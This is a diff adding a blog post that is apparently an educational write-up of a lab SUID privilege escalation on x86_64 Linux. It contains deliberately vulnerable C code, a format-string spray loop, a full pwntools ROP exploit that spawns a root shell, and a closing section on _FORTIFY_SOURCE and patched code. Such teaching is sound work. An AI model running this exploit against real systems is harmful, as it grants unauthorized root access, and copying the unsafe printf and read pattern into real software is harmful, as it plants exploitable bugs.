@@ -1,0 +1,320 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Full-Chain SUID Privilege Escalation | Vedant Karande</title>
+    <link rel="stylesheet" href="./blog.css">
+  </head>
+  <body>
+    <a href="../index.html" class="back-btn">← Back to Portfolio</a>
+
+    <article class="content">
+      <div class="fade-in">
+        <span
+          style="
+            color: var(--neon-blue);
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            font-weight: 600;
+            letter-spacing: 1px;
+          "
+          >Systems Security & Exploit Development</span
+        >
+        <h1>
+          Bypassing Modern Binary Protections: A Full-Chain SUID Privilege Escalation
+        </h1>
+        <p class="metadata">
+          Published: March 13, 2026 | Architecture: x86_64 Linux
+        </p>
+        <a href="https://github.com/Vedantk6403/suid-fullchain-bypass" target="_blank" class="github-repo-btn fade-in">
+          <svg viewBox="0 0 24 24" width="20" height="20">
+            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+          </svg>
+          View Exploit Code on GitHub
+        </a>
+      </div>
+
+      <div class="fade-in">
+        <p>
+          Exploiting a simple buffer overflow is a fundamental exercise, but modern 64-bit Linux environments demand a more sophisticated approach. Today's systems security relies on a fortress of mitigations: <strong>ASLR</strong> (Address Space Layout Randomization), <strong>PIE</strong> (Position Independent Executables), <strong>NX</strong> (Non-Executable Stack), and <strong>Stack Canaries</strong>. Gone are the days of simply pointing the Instruction Pointer (RIP) at a block of shellcode.
+        </p>
+        <p>
+          In this research, we will chain a Format String memory leak with a classic Buffer Overflow to dynamically bypass ASLR, surgically restore the Stack Canary, align the stack to avoid CPU faults, and execute a Return-Oriented Programming (ROP) chain to drop a root shell from an SUID binary.
+        </p>
+      </div>
+
+      <h2 class="fade-in">1. The Target Environment & Defenses (<code>checksec</code>)</h2>
+      <div class="fade-in">
+        <p>
+          Before writing a single line of an exploit, a vulnerability researcher must understand the battlefield. Running the <code>checksec</code> tool against our target binary reveals the exact security mitigations compiled into the executable by the operating system.
+        </p>
+        
+        <img src="../images/prevesc/CheckSec.png" alt="Checksec output showing NX, PIE, Canary, and full RELRO enabled, but lacking FORTIFY" loading="lazy">
+        <p style="font-size: 0.9em; font-style: italic; text-align: center; color: #888;">
+          Figure 1: Initial checksec output. Green indicates enabled mitigations, while red indicates critical weaknesses.
+        </p>
+
+        <h3>Decoding the <code>checksec</code> Parameters</h3>
+        <p>Here is exactly what each of these parameters means, and how they dictate our exploit strategy:</p>
+        
+        <ul>
+            <li><strong>RELRO (Relocation Read-Only):</strong> <em>Full RELRO.</em> This secures the Global Offset Table (GOT). Because it is "Full", the entire GOT is marked strictly read-only immediately after the program starts. This completely eliminates "GOT Overwrite" attacks, forcing us to hijack the return address on the stack instead.</li>
+            <li><strong>STACK CANARY:</strong> <em>Canary found.</em> This is an 8-byte randomized secret value placed directly before the saved instruction pointer (RIP) on the stack. If our buffer overflow corrupts it, the program will instantly abort with a <code>*** stack smashing detected ***</code> error. We cannot simply smash past it; we must leak it and surgically replace it.</li>
+            <li><strong>NX (Non-Executable Stack):</strong> <em>NX enabled.</em> This hardware-level protection (DEP) marks the stack memory region as strictly read/write, but not executable. We cannot inject our own shellcode onto the stack and execute it. This forces us to use <strong>Return-Oriented Programming (ROP)</strong>.</li>
+            <li><strong>PIE (Position Independent Executable):</strong> <em>PIE enabled.</em> This randomizes the base memory address where the binary's code is loaded every time it runs. We cannot hardcode memory addresses for our ROP gadgets; we must calculate them dynamically using a memory leak.</li>
+            <li><strong>RPATH / RUNPATH:</strong> <em>No RPATH / No RUNPATH.</em> These parameters dictate custom search paths for shared libraries. If present and writable by an attacker, they can lead to trivial DLL/Library hijacking. Our binary is secure here.</li>
+            <li><strong>Symbols:</strong> <em>Not Stripped.</em> This is a massive red flag (and our first advantage). It means the developer left the debugging symbols in the binary. Instead of reverse-engineering unnamed assembly functions in a disassembler like Ghidra, we can clearly see the exact function names.</li>
+            <li><strong>FORTIFY:</strong> <em>Disabled.</em> This is the critical weakness that makes our exploit possible. <code>_FORTIFY_SOURCE</code> is a powerful compiler defense that automatically replaces dangerous functions with hardened, bounds-checking equivalents. Because it is off, the binary will blindly accept our overflows.</li>
+        </ul>
+      </div>
+
+      <h2 class="fade-in">2. The Vulnerabilities (The Primitives)</h2>
+      <div class="fade-in">
+        <p>
+          To defeat the towering mitigations shown in <code>checksec</code>, we need two distinct primitives: a way to <em>read</em> memory (to bypass ASLR and the Canary) and a way to <em>write</em> memory (to hijack the execution flow).
+        </p>
+
+        <h3>Bug 1: Format String (The Read Primitive)</h3>
+        <p>
+          In the <code>welcome_user</code> function, the developer directly passes the command-line argument (<code>argv[1]</code>) into a <code>printf()</code> call without a format specifier. By supplying positional format specifiers like <code>%31$p</code>, we can force the program to traverse the stack and print raw memory addresses, exposing our Canary and Libc pointers.
+        </p>
+
+        <h3>Bug 2: The Classic Buffer Overflow (The Write Primitive)</h3>
+        <p>
+          The <code>process_feedback</code> function contains a textbook buffer overflow. The developer allocated a 64-byte array on the stack, but explicitly instructed the <code>read()</code> system call to accept up to 256 bytes from the user. 
+        </p>
+
+        <div class="code-container">
+          <div class="mac-dots">
+            <div class="mac-dot red"></div>
+            <div class="mac-dot yellow"></div>
+            <div class="mac-dot green"></div>
+          </div>
+          <button class="copy-btn">Copy</button>
+          <pre><code>void process_feedback() {
+    char buffer[64];
+    printf("\nEnter your feedback (Max 64 chars): ");
+    fflush(stdout);
+    
+    // VULNERABILITY 2: Classic Buffer Overflow
+    // read() allows 256 bytes into a 64-byte buffer.
+    read(0, buffer, 256); 
+}
+
+void welcome_user(char *user_input) {
+    // VULNERABILITY 1: Format String Leak
+    printf("Current Session for: ");
+    printf(user_input); // Unsafe!
+    printf("\n");
+}</code></pre>
+        </div>
+      </div>
+
+      <h2 class="fade-in">3. Stage 1: Leaking the Secrets</h2>
+      <div class="fade-in">
+        <p>
+          <strong>ASLR</strong> randomizes where Libc is loaded in memory, and the <strong>Stack Canary</strong> is a randomized 8-byte value placed directly before the return address. Both must be leaked dynamically on every single run before we can send our payload. 
+        </p>
+        <p>
+          To map the stack, I used a bash loop to spray format specifiers into the program: <code>for i in {25..40}; do echo "A" | ./vuln "%$i\$p"; done</code>. <em>(Note: We pipe "A" into the program to cleanly bypass the subsequent feedback prompt during our loop).</em>
+        </p>
+
+        <img src="../images/prevesc/finding_canary_in_vuln.png" alt="Terminal output showing a format string spray revealing the canary and libc addresses" loading="lazy" style="margin-top: 20px;">
+        <p style="font-size: 0.9em; font-style: italic; text-align: center; color: #888;">
+          Figure 2: Format String stack dump. Notice the structured layout of the leaked memory.
+        </p>
+
+        <h3>How to Read the Matrix (Identifying the Targets)</h3>
+        <p>When analyzing a raw hex dump, a vulnerability researcher relies on strict memory geography to identify targets:</p>
+        
+        <ul>
+            <li><strong>The Canary (Index 31):</strong> Look closely at <code>0xc4b04881fd7d3900</code>. On 64-bit Linux, the canary is always 8 bytes long. The first 7 bytes are high-entropy (randomized) data, but the very last byte is <strong>always</strong> <code>00</code> (a null byte). The OS enforces this <code>00</code> so that if a developer accidentally uses <code>strcpy()</code> on an adjacent buffer, the string function hits the null byte and stops, preventing accidental canary leaks.</li>
+            <li><strong>The Libc Leak (Index 33):</strong> Look at <code>0x7f31042faf68</code>. Addresses starting with <code>0x7f...</code> belong to shared libraries. Specifically, this leak sits exactly two stack rows beneath the canary, which is exactly where the saved return pointer back to <code>__libc_start_main</code> lives.</li>
+        </ul>
+      </div>
+
+      <h2 class="fade-in">4. Stage 2: Verifying with GDB & Memory Geography</h2>
+      <div class="fade-in">
+        <p>
+          Because ASLR moves Libc around every time, we cannot hardcode the address of <code>system()</code>. However, the <strong>distance</strong> (offset) between our leaked Libc address and the actual base of the Libc library is permanently fixed for the given OS kernel. We must use GDB to find this static offset.
+        </p>
+        
+        <img src="../images/prevesc/finding_libc_base_gdb.png" alt="GDB info proc mappings showing the true base of libc" loading="lazy" style="margin-top: 20px;">
+        <p style="font-size: 0.9em; font-style: italic; text-align: center; color: #888;">
+          Figure 3: Finding the True Libc Base in memory using GDB's process mappings.
+        </p>
+
+        <img src="../images/prevesc/All_address_final.png" alt="GDB output showing the leaked addresses to calculate the offset" loading="lazy" style="margin-top: 20px;">
+        <p style="font-size: 0.9em; font-style: italic; text-align: center; color: #888;">
+          Figure 4: Continuing the program to capture the leaked address for the offset calculation.
+        </p>
+
+        <h3>The Offset Calculation</h3>
+        <p>By pausing the program in GDB, we look at <code>info proc mappings</code> to find the "True Base" where <code>libc.so.6</code> was loaded (e.g., <code>0x7f526fa08000</code>). We then let the program continue and print our leak (e.g., <code>0x7f526fa31f68</code>). </p>
+        
+        <p>Subtracting the True Base from the Leaked Address yields a constant static offset: <strong><code>0x29f68</code></strong>. In our final Python script, we take the dynamic leak on every run, subtract <code>0x29f68</code>, and we instantly know exactly where Libc is located, entirely bypassing ASLR.</p>
+
+      </div>
+
+      <h2 class="fade-in">5. Stage 3: Anatomy of the ROP Chain</h2>
+      <div class="fade-in">
+        <p>
+          With NX (Non-Executable Stack) enabled, we cannot execute shellcode on the stack. Instead, we use <strong>Return-Oriented Programming (ROP)</strong>. We hijack the Instruction Pointer and force it to bounce between small snippets of executable code ending in a <code>ret</code> instruction (called "gadgets") located inside the Libc library.
+        </p>
+
+        <div class="stack-diagram" style="margin: 30px 0; font-family: monospace;">
+          <div class="stack-row" style="background: transparent; border: none; text-align: center; color: #888;">↑ Higher Memory Addresses (Executes Last) ↑</div>
+          <div class="stack-row rip" style="background-color: #ff4757; color: white; padding: 12px;"><strong>Step 5:</strong> <code>libc.symbols['system']</code> <br><span style="font-size: 0.8em; font-weight: normal;">(Executes the shell using the string pointed to by RDI)</span></div>
+          <div class="stack-row rip" style="background-color: #ff6b81; color: white; padding: 12px;"><strong>Step 4:</strong> <code>next(libc.search(b"/bin/sh"))</code> <br><span style="font-size: 0.8em; font-weight: normal;">(Data: The memory address of the string "/bin/sh")</span></div>
+          <div class="stack-row rip" style="background-color: #ff4757; color: white; padding: 12px;"><strong>Step 3:</strong> <code>libc.symbols['setuid']</code> <br><span style="font-size: 0.8em; font-weight: normal;">(Executes setuid(0) using the 0 currently in RDI)</span></div>
+          <div class="stack-row rip" style="background-color: #ff6b81; color: white; padding: 12px;"><strong>Step 2:</strong> <code>0x0000000000000000</code> <br><span style="font-size: 0.8em; font-weight: normal;">(Data: The integer 0, popped into RDI)</span></div>
+          <div class="stack-row rip" style="background-color: #3742fa; color: white; padding: 12px;"><strong>Step 1:</strong> <code>pop rdi; ret</code> <br><span style="font-size: 0.8em; font-weight: normal;">(Gadget: Takes the next item on stack and places it in the RDI register)</span></div>
+          <div class="stack-row rip" style="background-color: #ff7f50; color: white; padding: 12px;"><strong>Step 0:</strong> <code>ret</code> <br><span style="font-size: 0.8em; font-weight: normal;">(Stack Alignment Gadget - Shifts RSP by 8 bytes)</span></div>
+          <div class="stack-row rbp" style="background-color: #2f3542; color: white;">Saved RBP (8 bytes of garbage "B"s)</div>
+          <div class="stack-row rip" style="background-color: #2ed573; color: #000; font-weight: bold; border: 2px solid #fff;">Leaked Stack Canary (Surgically Restored)</div>
+          <div class="stack-row buffer" style="background-color: #57606f; color: white;">72 Bytes of Padding ("A"s)</div>
+          <div class="stack-row" style="background: transparent; border: none; text-align: center; color: #888;">↓ Lower Memory Addresses (Executes First) ↓</div>
+        </div>
+
+        <h3>Breaking Down the Chain Execution</h3>
+        <p>Unlike 32-bit Linux where function arguments are passed directly on the stack, <strong>64-bit Linux uses the System V AMD64 ABI calling convention</strong>. This means the first argument to any function must be stored in the <code>RDI</code> register before the function is called.</p>
+        
+        <ol>
+            <li><strong>The <code>pop rdi; ret</code> Gadget:</strong> To call <code>setuid(0)</code>, we need to get the number <code>0</code> into the <code>RDI</code> register. When our gadget executes, it pops the next item on the stack (the <code>0</code> we provided) into <code>RDI</code>.</li>
+            <li><strong>The <code>setuid(0)</code> Call:</strong> Because our binary has the SUID bit set, we must execute this to tell the OS kernel to formally elevate our process privileges to root. Without this, <code>system("/bin/sh")</code> would merely spawn a normal user shell.</li>
+            <li><strong>Loading the String:</strong> We call <code>pop rdi; ret</code> again, but this time we provide the memory address of the string <code>"/bin/sh"</code> (which is natively compiled into the Libc library).</li>
+            <li><strong>Spawning the Shell:</strong> We finally call <code>system()</code>. It looks at the <code>RDI</code> register, sees the pointer to <code>"/bin/sh"</code>, and executes it.</li>
+        </ol>
+
+        <div style="background-color: rgba(255, 71, 87, 0.1); border-left: 4px solid #ff4757; padding: 15px; margin: 20px 0; border-radius: 4px;">
+          <strong style="color: #ff4757;">Pitfall: The Phantom Shell (Ubuntu movaps crash)</strong><br>
+          <p style="margin-bottom: 0; font-size: 0.95em;">During early exploitation, the script successfully hijacked execution, but the moment the shell dropped, it silently crashed with Exit Code 0 or threw an EOF error. This is the notorious <code>movaps</code> curse. The <code>system()</code> function utilizes advanced instructions that hard-fault (SIGSEGV) if the stack pointer (RSP) is not aligned to a 16-byte boundary. Injecting a dummy <code>ret</code> gadget at the very beginning of the chain serves as a "no-op" that cleanly shifts the stack by 8 bytes, aligning it perfectly and preventing the crash.</p>
+        </div>
+      </div>
+
+      <h2 class="fade-in">6. Execution & Escalation to Root</h2>
+      <div class="fade-in">
+        <p>
+          After compiling the vulnerable binary, assigning ownership to <code>root</code>, and enabling the SUID bit (<code>chmod 4755 vuln</code>), the Python exploit script is launched. It dynamically parses the binary context, harvests the format string leaks from the CLI execution, calculates the precise Libc boundaries, and fires the 256-byte payload into the feedback buffer to pop the shell.
+        </p>
+
+        <img src="../images/prevesc/Exploit_proof.png" alt="Successful exploitation resulting in uid=0(root)" loading="lazy">
+        <p style="font-size: 0.9em; font-style: italic; text-align: center; color: #888;">
+          Figure 5: Full-chain execution resulting in a root shell. Validated via <code>whoami</code> and <code>id</code>.
+        </p>
+
+        <h3>The Final Exploit Code</h3>
+        <div class="code-container">
+          <div class="mac-dots">
+            <div class="mac-dot red"></div>
+            <div class="mac-dot yellow"></div>
+            <div class="mac-dot green"></div>
+          </div>
+          <button class="copy-btn">Copy</button>
+          <pre><code>from pwn import *
+
+# 1. Setup
+exe = ELF('./vuln')
+context.binary = exe # Crucial for 64-bit packing!
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+# Start the process and pass our precise leaks via argv[1]
+p = process([exe.path, '%31$p.%33$p']) 
+
+# 2. Extract Leaks
+p.recvuntil(b"Current Session for: ")
+leaks = p.recvline().decode().strip().split('.')
+
+canary = int(leaks[0], 16)
+libc_leak = int(leaks[1], 16)
+
+log.success(f"Leaked Canary: {hex(canary)}")
+log.success(f"Leaked Libc: {hex(libc_leak)}")
+
+# 3. Calculate Libc Base
+libc.address = libc_leak - 0x29f68 
+log.success(f"Libc Base: {hex(libc.address)}")
+
+# 4. ROP Gadgets
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0] # Stack alignment gadget
+
+# 5. Build Payload
+payload = b"A" * 72          # Padding
+payload += p64(canary)       # Surgically replace the Canary
+payload += b"B" * 8          # Overwrite the saved RBP
+
+# Privilege Escalation (setuid(0))
+payload += p64(pop_rdi)
+payload += p64(0)
+payload += p64(libc.symbols['setuid'])
+
+# Spawn Root Shell (system("/bin/sh"))
+payload += p64(ret)          # Align stack to 16-bytes to prevent movaps crash
+payload += p64(pop_rdi)
+payload += p64(next(libc.search(b"/bin/sh")))
+payload += p64(libc.symbols['system'])
+
+# 6. Fire the Exploit
+p.recvuntil(b"Enter your feedback (Max 64 chars): ")
+p.sendline(payload)
+
+log.info("Firing ROP chain... Dropping to shell!")
+p.interactive()</code></pre>
+        </div>
+      </div>
+
+      <h2 class="fade-in">7. Mitigations & Secure Coding</h2>
+      <div class="fade-in">
+        <p>
+          This exploit successfully bypassed four major memory protections (NX, PIE, ASLR, and Canaries), but it was only possible because we had the "primitives" to read and write memory arbitrarily due to poor C programming. 
+        </p>
+        
+        <h3>The Power of <code>_FORTIFY_SOURCE=2</code></h3>
+        <p>If the binary had been compiled with <code>_FORTIFY_SOURCE=2</code>, the compiler would have actively sabotaged our exploit during the compilation phase by replacing standard libc functions with hardened wrappers:</p>
+        
+        <ul>
+            <li><strong>Defeating the Leak (<code>__printf_chk</code>):</strong> Fortify replaces <code>printf</code> with <code>__printf_chk</code>. If it detects that a format string is located in writable memory (like the Stack, where user input lives) rather than read-only memory (<code>.rodata</code>), it strictly blocks positional arguments like <code>%31$p</code>. The program aborts instantly, completely blinding our exploit.</li>
+            <li><strong>Defeating the Overflow (<code>__read_chk</code>):</strong> Fortify replaces <code>read</code> with <code>__read_chk</code>. Because our buffer array size is statically known at compile-time (64 bytes), the compiler passes this metadata to the checking function. It intercepts the call at runtime, realizes we are trying to write 256 bytes into a 64-byte array, and throws a fatal error before our payload even reaches the Canary.</li>
+        </ul>
+
+        <h3>The Patched Code</h3>
+        <p>To fundamentally prevent these bugs at the source level, developers must enforce strict input formatting and bound limits. Here is the securely patched version of the target binary:</p>
+        
+        <div class="code-container">
+          <div class="mac-dots">
+            <div class="mac-dot red"></div>
+            <div class="mac-dot yellow"></div>
+            <div class="mac-dot green"></div>
+          </div>
+          <button class="copy-btn">Copy</button>
+          <pre><code>void process_feedback() {
+    char buffer[64];
+    printf("\nEnter your feedback (Max 64 chars): ");
+    fflush(stdout);
+    
+    // PATCH 2: Buffer Overflow Fixed
+    // Using sizeof(buffer) strictly constrains the read limit.
+    read(0, buffer, sizeof(buffer)); 
+}
+
+void welcome_user(char *user_input) {
+    // PATCH 1: Format String Leak Fixed
+    // By using "%s", printf treats the input strictly as a literal string.
+    printf("Current Session for: ");
+    printf("%s", user_input); 
+    printf("\n");
+    fflush(stdout);
+}</code></pre>
+        </div>
+
+        <h3>Conclusion</h3>
+        <p>Modern binary exploitation is a puzzle of constraints. As hardware and compilers evolve to eradicate entire classes of vulnerabilities, exploiting a binary requires chaining multiple distinct logic flaws together. It demands a deep understanding of not just the vulnerability, but the OS's memory geography, the C Standard Library, and the underlying CPU architecture.</p>
+      </div>
+    </article>
+
+    <script src="./blog.js"></script>
+  </body>
+</html>
